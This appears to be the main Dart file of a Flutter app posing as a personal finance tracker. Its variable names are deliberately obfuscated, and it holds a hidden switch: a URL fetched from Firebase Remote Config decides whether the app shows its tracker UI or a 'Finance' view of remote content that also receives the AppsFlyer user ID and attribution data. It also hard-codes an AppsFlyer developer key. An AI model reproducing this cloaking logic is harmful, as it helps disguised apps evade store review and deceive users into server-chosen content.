import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'core/utils.dart';
import 'features/firebase_options.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/safe/bloc/safe_bloc.dart';
import 'features/splash/onboard_page.dart';
import 'features/transaction/bloc/transaction_bloc.dart';

int fdnsjknsdjf = 0;
String ndsnfjknsd = '';
late AppsflyerSdk sdfnkjfnjsd;
String fnksdjfn = '';
bool skfnskfj = false;
String fndsjkfnkds = '';
String fnjsdfjkdfn = '';
Map fdsnkfjnksjdf = {};
Map skdfnksfnkds = {};
bool fsnkfnskjdf = false;
String nsjfnjksdn = '';
String sdfnjkfnjsd = '';
String fnsdknfjksd = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await fmjdsknfkjds();
  asdasfs();
  await initHive();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

void asdasfs() async {
  final AppsFlyerOptions sdfkjnkfjnsd = AppsFlyerOptions(
    showDebug: false,
    afDevKey: '4rYehnSYQsVcM2jmim5KyC',
    appId: '6670539342',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  sdfnkjfnjsd = AppsflyerSdk(sdfkjnkfjnsd);

  await sdfnkjfnjsd.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  sdfnkjfnjsd.onAppOpenAttribution((res) {
    fdsnkfjnksjdf = res;
    fnjsdfjkdfn = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  sdfnkjfnjsd.onInstallConversionData((res) {
    skdfnksfnkds = res;
    fsnkfnskjdf = res['payload']['is_first_launch'];
    nsjfnjksdn = res['payload']['af_status'];
    fndsjkfnkds = '&is_first_launch=$fsnkfnskjdf&af_status=$nsjfnjksdn';
  });

  sdfnkjfnjsd.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    fdsnkfjnksjdf = dp.toJson();
  });
  ndsnfjknsd = await sdfnkjfnjsd.getAppsFlyerUID() ?? '';
  sdfnkjfnjsd.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<void> fmjdsknfkjds() async {
  final TrackingStatus sdkfnjksd =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(sdkfnjksd);
}

String sdkfjnksfd = '';

Future<bool> sdknjkfn() async {
  final fnjkdsfnk = FirebaseRemoteConfig.instance;
  await fnjkdsfnk.fetchAndActivate();
  String fskjfnk = fnjkdsfnk.getString('coines');
  String snfkjsdnf = fnjkdsfnk.getString('coiles');
  if (!fskjfnk.contains('nores')) {
    final fnkjnsdf = HttpClient();
    final kfjsdnfk = Uri.parse(fskjfnk);
    final fnjsdkfnj = await fnkjnsdf.getUrl(kfjsdnfk);
    fnjsdkfnj.followRedirects = false;
    final response = await fnjsdkfnj.close();
    if (response.headers.value(HttpHeaders.locationHeader) != snfkjsdnf) {
      sdkfjnksfd = fskjfnk;
      return true;
    } else {
      return false;
    }
  }
  return fskjfnk.contains('nores') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImages(context);

    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: sdknjkfn(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
            );
          } else {
            if (snapshot.data == true && sdkfjnksfd != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: Finance(
                  fnjufsd: sdkfjnksfd,
                  njdaksdas: ndsnfjknsd,
                  mkda: fnjsdfjkdfn,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => TransactionBloc()),
                  BlocProvider(create: (context) => SafeBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        },
      ),
    );
  }
}
